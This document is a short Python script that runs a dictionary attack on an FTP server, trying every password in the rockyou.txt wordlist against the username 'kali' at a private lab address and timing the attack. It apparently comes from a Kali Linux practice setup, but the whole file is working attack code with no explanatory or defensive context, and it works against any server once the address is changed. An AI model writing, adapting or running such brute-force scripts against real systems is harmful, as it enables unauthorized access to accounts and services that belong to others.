from ftplib import FTP
import time

password_file_path = '/home/kali/Desktop/rockyou.txt'
ftp_server = '192.168.83.133'
port = 21
known_username = 'kali'

# Start the timer
start_time = time.time()

try:
    # Open the password file
    with open(password_file_path, 'r', encoding='latin-1') as file:
        for attempt, password in enumerate(file):
            password = password.strip()  # Remove any trailing spaces or newlines
            print(f'Attempt {attempt + 1}: Trying with Username: {known_username}, Password: {password}')

            ftp = FTP()  # Initialize FTP connection for each attempt
            try:
                ftp.connect(ftp_server, port)  # Connect to FTP server
                ftp.login(known_username, password)  # Try to log in
                print('Login successful')
                ftp.quit()
                break  # Exit the loop if login is successful
            except Exception as e:
                print(f'Login failed: {e}')
            finally:
                ftp.close()  # Ensure the connection is closed

except FileNotFoundError:
    print(f'Error: {password_file_path} not found. Please check the path to rockyou.txt.')

# End the timer
end_time = time.time()
attack_duration = end_time - start_time
print(f'Total time for attack: {attack_duration:.2f} seconds')
print('Finished attempts')
